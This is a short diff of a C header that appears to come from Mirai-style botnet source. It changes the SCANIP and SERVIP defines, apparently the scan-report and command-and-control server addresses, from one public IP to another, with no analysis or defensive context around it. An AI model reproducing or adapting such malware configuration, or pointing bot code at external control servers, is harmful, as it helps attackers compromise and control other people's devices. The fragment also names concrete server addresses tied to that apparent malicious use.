@@ -22,8 +22,8 @@ typedef uint16_t port_t;
 
 #define SINGLE_INSTANCE_PORT 21769
 
-#define SCANIP (int)inet_addr((const char*)"167.99.95.255");
-#define SERVIP (int)inet_addr((const char*)"167.99.95.255");
+#define SCANIP (int)inet_addr((const char*)"162.216.114.40");
+#define SERVIP (int)inet_addr((const char*)"162.216.114.40");
 
 ipv4_t LOCAL_ADDR;
 
